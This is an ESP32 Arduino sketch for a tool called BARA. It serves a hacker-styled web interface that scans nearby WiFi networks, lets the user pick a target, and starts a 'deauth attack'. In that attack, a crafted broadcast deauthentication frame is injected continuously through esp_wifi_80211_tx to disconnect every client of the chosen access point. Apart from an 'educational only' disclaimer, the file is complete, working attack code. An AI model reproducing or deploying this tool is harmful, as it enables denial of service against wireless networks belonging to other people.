/*
 * BARA - Advanced WiFi Security Testing Tool
 * Developer: Ahmed Nour Ahmed - Qena, Egypt
 * Version: 2.0
 * 
 * WARNING: This tool is for EDUCATIONAL PURPOSES ONLY!
 * Unauthorized access to networks you don't own is ILLEGAL.
 * Use only on networks you have permission to test.
 */

#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <esp_event.h>
#include <nvs_flash.h>

// Configuration
const char* ap_ssid = "bara";
const char* ap_password = "A7med@Elshab7";
const char* toolName = "BARA";
const char* developer = "Ahmed Nour Ahmed";
const char* location = "Qena, Egypt";

WebServer server(80);

// Deauth packet configuration
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         // Type/Subtype: Deauthentication
  0x3A, 0x01,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence number
  0x07, 0x00                          // Reason code: Class 3 frame received
};

// Global variables
bool attackRunning = false;
String targetSSID = "";
String targetBSSID = "";
int targetChannel = 1;
unsigned long packetsCount = 0;
unsigned long startTime = 0;

// Scan results storage
struct WiFiNetwork {
  String ssid;
  String bssid;
  int channel;
  int rssi;
  String encryption;
};

std::vector<WiFiNetwork> scannedNetworks;

// HTML Pages
const char* HTML_HEAD = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BARA - WiFi Security Tool</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Courier New', monospace;
  background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 50%, #0a0000 100%);
  color: #00ff00;
  min-height: 100vh;
  overflow-x: hidden;
  position: relative;
}

body::before {
  content: '';
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: 
    repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(255, 0, 0, 0.03) 2px,
      rgba(255, 0, 0, 0.03) 4px
    );
  pointer-events: none;
  z-index: 1;
  animation: scanlines 8s linear infinite;
}

@keyframes scanlines {
  0% { transform: translateY(0); }
  100% { transform: translateY(50px); }
}

.container {
  max-width: 1400px;
  margin: 0 auto;
  padding: 20px;
  position: relative;
  z-index: 2;
}

.header {
  text-align: center;
  padding: 30px 20px;
  background: rgba(0, 0, 0, 0.8);
  border: 2px solid #ff0000;
  border-radius: 10px;
  margin-bottom: 30px;
  box-shadow: 0 0 30px rgba(255, 0, 0, 0.5), inset 0 0 20px rgba(255, 0, 0, 0.1);
  position: relative;
  overflow: hidden;
}

.header::before {
  content: '';
  position: absolute;
  top: -50%;
  left: -50%;
  width: 200%;
  height: 200%;
  background: radial-gradient(circle, rgba(255, 0, 0, 0.1) 0%, transparent 70%);
  animation: pulse 3s ease-in-out infinite;
}

@keyframes pulse {
  0%, 100% { transform: scale(1); opacity: 0.5; }
  50% { transform: scale(1.1); opacity: 0.8; }
}

.header h1 {
  font-size: 3.5em;
  color: #ff0000;
  text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000;
  margin-bottom: 10px;
  letter-spacing: 8px;
  position: relative;
  z-index: 1;
  animation: glitch 3s infinite;
}

@keyframes glitch {
  0%, 90%, 100% { transform: translate(0); }
  92% { transform: translate(-2px, 2px); }
  94% { transform: translate(2px, -2px); }
  96% { transform: translate(-2px, -2px); }
  98% { transform: translate(2px, 2px); }
}

.subtitle {
  color: #00ff00;
  font-size: 1.2em;
  text-shadow: 0 0 10px #00ff00;
  position: relative;
  z-index: 1;
}

.developer {
  margin-top: 10px;
  color: #ff6b6b;
  font-size: 0.9em;
  position: relative;
  z-index: 1;
}

.section {
  background: rgba(0, 0, 0, 0.9);
  border: 2px solid #ff0000;
  border-radius: 10px;
  padding: 25px;
  margin-bottom: 25px;
  box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
  backdrop-filter: blur(10px);
}

.section h2 {
  color: #ff0000;
  margin-bottom: 20px;
  font-size: 1.8em;
  text-shadow: 0 0 10px #ff0000;
  border-bottom: 2px solid #ff0000;
  padding-bottom: 10px;
}

.btn {
  background: linear-gradient(135deg, #ff0000, #cc0000);
  color: #fff;
  border: 2px solid #ff0000;
  padding: 15px 30px;
  font-size: 1.1em;
  cursor: pointer;
  border-radius: 5px;
  font-family: 'Courier New', monospace;
  font-weight: bold;
  transition: all 0.3s;
  box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
  text-transform: uppercase;
  letter-spacing: 2px;
  margin: 5px;
}

.btn:hover {
  background: linear-gradient(135deg, #ff3333, #ff0000);
  box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
  transform: translateY(-2px);
}

.btn:active {
  transform: translateY(0);
}

.btn-stop {
  background: linear-gradient(135deg, #cc0000, #990000);
}

.networks-table {
  width: 100%;
  border-collapse: collapse;
  margin-top: 20px;
}

.networks-table th,
.networks-table td {
  padding: 12px;
  text-align: left;
  border-bottom: 1px solid #ff0000;
}

.networks-table th {
  background: rgba(255, 0, 0, 0.2);
  color: #ff0000;
  font-weight: bold;
  text-transform: uppercase;
}

.networks-table tr:hover {
  background: rgba(255, 0, 0, 0.1);
}

.network-row {
  cursor: pointer;
  transition: all 0.3s;
}

.network-row:hover {
  background: rgba(255, 0, 0, 0.2);
  box-shadow: inset 0 0 10px rgba(255, 0, 0, 0.3);
}

.signal-strength {
  display: inline-block;
  padding: 4px 8px;
  border-radius: 3px;
  font-weight: bold;
}

.signal-excellent { color: #00ff00; }
.signal-good { color: #ffff00; }
.signal-fair { color: #ff9900; }
.signal-poor { color: #ff0000; }

.stats {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 15px;
  margin-top: 20px;
}

.stat-box {
  background: rgba(255, 0, 0, 0.1);
  border: 1px solid #ff0000;
  padding: 15px;
  border-radius: 5px;
  text-align: center;
}

.stat-value {
  font-size: 2em;
  color: #ff0000;
  font-weight: bold;
  text-shadow: 0 0 10px #ff0000;
}

.stat-label {
  color: #00ff00;
  margin-top: 5px;
}

.alert {
  padding: 15px;
  margin-bottom: 20px;
  border-radius: 5px;
  border-left: 4px solid #ff0000;
  background: rgba(255, 0, 0, 0.1);
  animation: blink 2s infinite;
}

@keyframes blink {
  0%, 50%, 100% { opacity: 1; }
  25%, 75% { opacity: 0.7; }
}

.loading {
  display: inline-block;
  margin-left: 10px;
}

.loading::after {
  content: '...';
  animation: loading 1.5s infinite;
}

@keyframes loading {
  0% { content: '.'; }
  33% { content: '..'; }
  66% { content: '...'; }
}

.attack-status {
  font-size: 1.5em;
  font-weight: bold;
  text-align: center;
  padding: 20px;
  margin: 20px 0;
  border-radius: 5px;
  text-transform: uppercase;
  letter-spacing: 3px;
}

.status-active {
  background: rgba(255, 0, 0, 0.2);
  border: 2px solid #ff0000;
  color: #ff0000;
  animation: blink 1s infinite;
}

.status-inactive {
  background: rgba(0, 255, 0, 0.1);
  border: 2px solid #00ff00;
  color: #00ff00;
}

@media (max-width: 768px) {
  .header h1 { font-size: 2em; }
  .networks-table { font-size: 0.9em; }
  .btn { padding: 10px 20px; font-size: 1em; }
}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>⚠ BARA ⚠</h1>
<div class="subtitle">Advanced WiFi Security Testing Tool</div>
<div class="developer">Developed by Ahmed Nour Ahmed | Qena, Egypt</div>
</div>

<div class="alert">
<strong>⚠️ WARNING:</strong> This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY. 
Unauthorized network interference is ILLEGAL. Use responsibly!
</div>
)rawliteral";

const char* HTML_MAIN_PAGE = R"rawliteral(
<div class="section">
<h2>🔍 Network Scanner</h2>
<p>Scan for nearby WiFi networks and analyze their security.</p>
<button class="btn" onclick="scanNetworks()">Start Scan</button>
<div id="scanResults"></div>
</div>

<div class="section">
<h2>⚔️ Attack Control</h2>
<div id="attackStatus" class="attack-status status-inactive">SYSTEM READY</div>
<div id="attackStats"></div>
<div id="attackControls" style="text-align: center; margin-top: 20px;">
<p style="color: #ffff00;">Select a network from the scan results to begin attack</p>
</div>
</div>

<script>
let scanInterval = null;
let statusInterval = null;

function scanNetworks() {
  document.getElementById('scanResults').innerHTML = '<p>Scanning<span class="loading"></span></p>';
  
  fetch('/scan')
    .then(response => response.json())
    .then(data => {
      displayNetworks(data.networks);
    })
    .catch(error => {
      document.getElementById('scanResults').innerHTML = '<p style="color: #ff0000;">Scan failed: ' + error + '</p>';
    });
}

function displayNetworks(networks) {
  if (networks.length === 0) {
    document.getElementById('scanResults').innerHTML = '<p>No networks found</p>';
    return;
  }
  
  let html = '<table class="networks-table"><thead><tr>';
  html += '<th>SSID</th><th>BSSID</th><th>Channel</th><th>Signal</th><th>Encryption</th><th>Action</th>';
  html += '</tr></thead><tbody>';
  
  networks.forEach(net => {
    let signalClass = 'signal-poor';
    let signalText = 'Poor';
    if (net.rssi > -50) { signalClass = 'signal-excellent'; signalText = 'Excellent'; }
    else if (net.rssi > -60) { signalClass = 'signal-good'; signalText = 'Good'; }
    else if (net.rssi > -70) { signalClass = 'signal-fair'; signalText = 'Fair'; }
    
    html += '<tr class="network-row">';
    html += '<td><strong>' + (net.ssid || '[Hidden]') + '</strong></td>';
    html += '<td>' + net.bssid + '</td>';
    html += '<td>' + net.channel + '</td>';
    html += '<td class="' + signalClass + '">' + signalText + ' (' + net.rssi + ' dBm)</td>';
    html += '<td>' + net.encryption + '</td>';
    html += '<td><button class="btn" style="padding: 8px 15px; font-size: 0.9em;" onclick="selectTarget(\'' + 
            net.ssid + '\',\'' + net.bssid + '\',' + net.channel + ')">TARGET</button></td>';
    html += '</tr>';
  });
  
  html += '</tbody></table>';
  document.getElementById('scanResults').innerHTML = html;
}

function selectTarget(ssid, bssid, channel) {
  let controls = '<div class="stats">';
  controls += '<div class="stat-box"><div class="stat-value">' + (ssid || '[Hidden]') + '</div><div class="stat-label">Target SSID</div></div>';
  controls += '<div class="stat-box"><div class="stat-value">' + bssid + '</div><div class="stat-label">Target BSSID</div></div>';
  controls += '<div class="stat-box"><div class="stat-value">' + channel + '</div><div class="stat-label">Channel</div></div>';
  controls += '</div>';
  controls += '<div style="text-align: center; margin-top: 20px;">';
  controls += '<button class="btn" onclick="startAttack(\'' + ssid + '\',\'' + bssid + '\',' + channel + ')">🔥 START DEAUTH ATTACK 🔥</button>';
  controls += '</div>';
  
  document.getElementById('attackControls').innerHTML = controls;
}

function startAttack(ssid, bssid, channel) {
  fetch('/attack/start?ssid=' + encodeURIComponent(ssid) + '&bssid=' + encodeURIComponent(bssid) + '&channel=' + channel)
    .then(response => response.json())
    .then(data => {
      if (data.status === 'started') {
        document.getElementById('attackStatus').className = 'attack-status status-active';
        document.getElementById('attackStatus').innerHTML = '⚔️ ATTACK IN PROGRESS ⚔️';
        document.getElementById('attackControls').innerHTML = 
          '<button class="btn btn-stop" onclick="stopAttack()">🛑 STOP ATTACK 🛑</button>';
        
        statusInterval = setInterval(updateStatus, 1000);
      }
    })
    .catch(error => alert('Failed to start attack: ' + error));
}

function stopAttack() {
  fetch('/attack/stop')
    .then(response => response.json())
    .then(data => {
      document.getElementById('attackStatus').className = 'attack-status status-inactive';
      document.getElementById('attackStatus').innerHTML = 'ATTACK STOPPED';
      clearInterval(statusInterval);
      updateStatus();
    })
    .catch(error => alert('Failed to stop attack: ' + error));
}

function updateStatus() {
  fetch('/status')
    .then(response => response.json())
    .then(data => {
      if (data.attacking) {
        let html = '<div class="stats">';
        html += '<div class="stat-box"><div class="stat-value">' + data.packets + '</div><div class="stat-label">Packets Sent</div></div>';
        html += '<div class="stat-box"><div class="stat-value">' + data.duration + 's</div><div class="stat-label">Duration</div></div>';
        html += '<div class="stat-box"><div class="stat-value">' + data.rate + '/s</div><div class="stat-label">Packet Rate</div></div>';
        html += '</div>';
        document.getElementById('attackStats').innerHTML = html;
      } else {
        if (statusInterval) {
          clearInterval(statusInterval);
          document.getElementById('attackStatus').className = 'attack-status status-inactive';
          document.getElementById('attackStatus').innerHTML = 'SYSTEM READY';
        }
      }
    });
}

// Auto-update when attack is running
setInterval(() => {
  fetch('/status')
    .then(response => response.json())
    .then(data => {
      if (data.attacking && !statusInterval) {
        statusInterval = setInterval(updateStatus, 1000);
      }
    });
}, 2000);
</script>
)rawliteral";

const char* HTML_FOOTER = R"rawliteral(
</div>
</body>
</html>
)rawliteral";

// WiFi scan handler
void handleScan() {
  scannedNetworks.clear();
  
  int n = WiFi.scanNetworks(false, true);
  
  String json = "{\"networks\":[";
  for (int i = 0; i < n; i++) {
    WiFiNetwork net;
    net.ssid = WiFi.SSID(i);
    net.bssid = WiFi.BSSIDstr(i);
    net.channel = WiFi.channel(i);
    net.rssi = WiFi.RSSI(i);
    
    switch (WiFi.encryptionType(i)) {
      case WIFI_AUTH_OPEN: net.encryption = "Open"; break;
      case WIFI_AUTH_WEP: net.encryption = "WEP"; break;
      case WIFI_AUTH_WPA_PSK: net.encryption = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK: net.encryption = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: net.encryption = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: net.encryption = "WPA2-Enterprise"; break;
      default: net.encryption = "Unknown";
    }
    
    scannedNetworks.push_back(net);
    
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + net.ssid + "\",";
    json += "\"bssid\":\"" + net.bssid + "\",";
    json += "\"channel\":" + String(net.channel) + ",";
    json += "\"rssi\":" + String(net.rssi) + ",";
    json += "\"encryption\":\"" + net.encryption + "\"";
    json += "}";
  }
  json += "]}";
  
  server.send(200, "application/json", json);
  WiFi.scanDelete();
}

// Start attack handler
void handleAttackStart() {
  if (server.hasArg("ssid") && server.hasArg("bssid") && server.hasArg("channel")) {
    targetSSID = server.arg("ssid");
    targetBSSID = server.arg("bssid");
    targetChannel = server.arg("channel").toInt();
    
    // Parse BSSID
    uint8_t bssid[6];
    sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
    
    // Set BSSID in deauth packet
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);
    
    // Set channel
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    attackRunning = true;
    packetsCount = 0;
    startTime = millis();
    
    server.send(200, "application/json", "{\"status\":\"started\"}");
  } else {
    server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing parameters\"}");
  }
}

// Stop attack handler
void handleAttackStop() {
  attackRunning = false;
  server.send(200, "application/json", "{\"status\":\"stopped\"}");
}

// Status handler
void handleStatus() {
  String json = "{";
  json += "\"attacking\":" + String(attackRunning ? "true" : "false") + ",";
  json += "\"packets\":" + String(packetsCount) + ",";
  
  if (attackRunning) {
    unsigned long duration = (millis() - startTime) / 1000;
    unsigned long rate = duration > 0 ? packetsCount / duration : 0;
    json += "\"duration\":" + String(duration) + ",";
    json += "\"rate\":" + String(rate) + ",";
    json += "\"target\":\"" + targetSSID + "\",";
    json += "\"bssid\":\"" + targetBSSID + "\",";
    json += "\"channel\":" + String(targetChannel);
  } else {
    json += "\"duration\":0,";
    json += "\"rate\":0";
  }
  
  json += "}";
  server.send(200, "application/json", json);
}

// Root handler
void handleRoot() {
  String html = HTML_HEAD;
  html += HTML_MAIN_PAGE;
  html += HTML_FOOTER;
  server.send(200, "text/html", html);
}

// Send deauth packets
void sendDeauthPackets() {
  if (attackRunning) {
    // Send to broadcast
    memcpy(&deauthPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    packetsCount++;
    
    delay(1); // Small delay to prevent ESP32 from crashing
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n\n");
  Serial.println("========================================");
  Serial.println("        BARA WiFi Security Tool        ");
  Serial.println("   Developer: Ahmed Nour Ahmed         ");
  Serial.println("   Location: Qena, Egypt               ");
  Serial.println("========================================");
  Serial.println();
  
  // Initialize NVS
  nvs_flash_init();
  
  // Configure WiFi
  WiFi.mode(WIFI_AP_STA);
  
  // Setup AP
  WiFi.softAP(ap_ssid, ap_password);
  Serial.println("Access Point Started");
  Serial.print("SSID: ");
  Serial.println(ap_ssid);
  Serial.print("Password: ");
  Serial.println(ap_password);
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());
  
  // Setup promiscuous mode for packet injection
  esp_wifi_set_promiscuous(true);
  
  // Setup web server routes
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack/start", handleAttackStart);
  server.on("/attack/stop", handleAttackStop);
  server.on("/status", handleStatus);
  
  server.begin();
  Serial.println("Web Server Started");
  Serial.println("========================================");
  Serial.println();
}

void loop() {
  server.handleClient();
  
  if (attackRunning) {
    sendDeauthPackets();
  }
  
  delay(1);
}
